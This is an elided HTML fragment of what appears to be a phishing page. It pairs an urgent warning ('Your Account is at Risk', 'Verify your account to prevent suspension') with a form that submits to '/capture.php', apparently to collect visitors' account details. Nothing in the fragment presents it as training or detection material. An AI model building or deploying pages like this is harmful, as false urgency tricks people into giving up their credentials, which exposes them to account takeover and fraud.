...
<head>
    ...
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        ...
        .box h1 { color: #FF2D55; font-size: 24px; }
        ...
        .box input:focus { outline: none; border-color: #FF2D55; }
        .box button {
            width: 100%;
            padding: 14px;
            margin-top: 15px;
        ...
        .badge { color: #FF2D55; font-size: 12px; margin-bottom: 10px; display: block; }
    </style>
</head>
<body>
    <div class="box">
        ...
        <span class="badge">⛔ Your Account is at Risk</span>
        <p class="sub">Verify your account to prevent suspension</p>
        <form method="POST" action="/capture.php">
            ...
            <button type="submit">🛡️ Verify & Save</button>
        </form>
